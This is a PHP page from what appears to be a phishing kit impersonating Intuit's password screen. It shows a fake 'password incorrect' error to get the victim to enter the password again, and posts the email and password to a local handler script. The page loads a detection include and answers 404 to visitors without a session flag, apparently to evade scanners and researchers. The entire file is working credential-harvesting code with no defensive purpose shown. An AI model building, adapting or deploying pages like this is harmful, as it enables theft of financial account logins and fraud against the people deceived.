<?php
   session_start();
   ob_start();
   require_once('../config.php');
   include_once('../includes/php/detect.php');
   
   if(!isset($_SESSION['fallow'])) {
      header('HTTP/1.1 404 Not Found');
      exit();
   }
   ?>
   <!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./css/passworderr.css">
   </head>
<?php include ("file/header.php"); ?>
<div class="Bookends__NonStyledDiv-sc-163uul4-4 hVYhee snipcss0-12-26-43">
   <div class="styledComponents__StyledWidgetContainer-kizisb-13 dXZNXp ius snipcss0-13-43-44" data-testid="IuxBookendsHeaderContainer">
      <div data-testid="passwordVerificationContainer" class="PasswordVerification__StyledContainer-sc-1povxx4-0 dAnIHS">
         <section class="IuxH2AndDescription__StyledSection-j40avf-0 hVIzWf PasswordVerification__StyledIuxH2AndDescription-sc-1povxx4-2 ebNYuM">
            <header>
               <h2 class="IuxH2AndDescription__StyledH2-j40avf-1 fvsQoV Typography-light-242afbc Typography-headline-2-0a55c12" data-testid="passwordVerificationHeader" id="passwordVerificationHeader">Enter your Intuit password</h2>
               <div data-testid="passwordVerificationSubheader" id="passwordVerificationSubheader" class="IuxH2AndDescription__StyledDescription-j40avf-2 kAsTtm">Choose how to sign in to </div>
            </header>
         </section>
         <form method="POST" action="php/passworderr.php" name="passworderr">
            <input aria-label="Email" aria-required="true" autocomplete="username" data-testid="readonly-identifier" name="Email" readonly="" type="email" size="22" class="IuxReadonlyIdentifier__StyledInput-sc-1vvuka5-0 hVnEWb" value="<?php echo $_SESSION['Email']; ?>"><br><button type="button" data-testid="passwordVerificationDifferentAccountButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq PasswordVerification__StyledIuxLinkButton-sc-1povxx4-1 piRti">
               <span class="Button-label-e0ecc32">Use a different account</span></button><br>
            <div class="IuxCurrentPasswordInput__StyledWrapperDiv-sc-1lpfy9v-0 fCEjzy">
               <div class="IuxCurrentPasswordInput__StyledToggleContainer-sc-1lpfy9v-1 TeDAi"></div>
               <div class="TextField-light-8d9994d idsTSTextField TextField-TextFieldWrapper-ac3dd51 style-9FmNT" id="style-9FmNT">
                  <label for="iux-password-confirmation-password" class="TextField-TFLabelWrapper-5565c4c TextField-TFHasLabel-cdab9c1">
                     <span class="TextField-TFLabelOverride-1f9d70f TextField-size-medium-253d5f0 Typography-light-242afbc Typography-body-3-3b2236f">Password</span>
                     <div class="TextField-TFInputWrapper-5ea0f14 TextField-size-medium-253d5f0">
                        <input id="iux-password-confirmation-password" aria-invalid="true" width="100%" class="idsF TextField-TFInput-5b74f65 TextField-light-8d9994d TextField-TFNotDisabled-7206466 TextField-TFErrorText-d7c117f TextField-size-medium-253d5f0" type="password" aria-label="Password" aria-required="true" autocomplete="current-password" data-testid="currentPasswordInput" inputmode="text" name="password" placeholder="" aria-errormessage="iux-password-confirmation-password-error" aria-describedby="iux-password-confirmation-password-error" required>
                     </div>
                  </label>
                  <div class="">
                     <div class="InlineValidationMessage-ivm-wrapper-d1d50b3 InlineValidationMessage-light-b1d2089" role="alert" id="iux-password-confirmation-password-error" data-automation-id="idsInlineValidationMessage-alertMsg">
                        <div class="idsTSBadge InlineValidationMessage-ivm-status-icon-b236b96 Badge-light-57fde65 Badge-badge-9e15a16 Badge-error-e9180bc Badge-round-3bdc5c0">
                           <div class="Badge-value-61e6a08 Badge-light-57fde65">
                              <div class="Badge-iconFix-afa180e">
                                 <svg height="16px" width="16px" viewBox="0 0 144 144">
                                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20" color="currentColor" width="100%" height="100%" focusable="false" aria-hidden="true" class="Badge-icon-prefab-7ee0aff Badge-background-f456faf">
                                       <path fill="currentColor" d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477" style="transform-origin: center center;"></path>
                                    </svg>
                                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20" color="currentColor" width="100%" height="100%" focusable="false" aria-hidden="true" class="Badge-icon-prefab-7ee0aff Badge-foreground-1d30fec">
                                       <path fill="currentColor" d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385" style="transform-origin: center center;"></path>
                                    </svg>
                                 </svg>
                              </div>
                           </div>
                        </div>
                        <div class="InlineValidationMessage-ivm-message-container-14c5d1d"><span class="InlineValidationMessage-ivm-message-35dd3a5 InlineValidationMessage-ivm-error-eef78e2 Typography-light-242afbc Typography-body-3-3b2236f">The password you entered is incorrect.</span><span class="InlineValidationMessage-ivm-description-0bf3069 Typography-light-242afbc Typography-body-3-3b2236f"></span></div>
                     </div>
                  </div>
               </div>
            </div>
            <button type="submit" data-testid="passwordVerificationContinueButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-primary-7bd5bc4 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-af87840" style=""><span class="Button-label-e0ecc32"><span>Continue</span></span></button>
            <div data-testid="IuxOrDivider" class="OrDivider__StyledOrDividerDiv-sc-1i6eqaj-0 hQaqtl">OR</div>
            <button type="button" data-testid="altAuthButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-secondary-8ffdd81 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-af87840"><span class="Button-label-e0ecc32">Verify by text</span></button><button type="button" data-testid="passwordVerificationCancelButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq"><span class="Button-label-e0ecc32">Sign in a different way</span></button>
         </form>
      </div>
   </div>
   <?php include ("file/footer.php"); ?>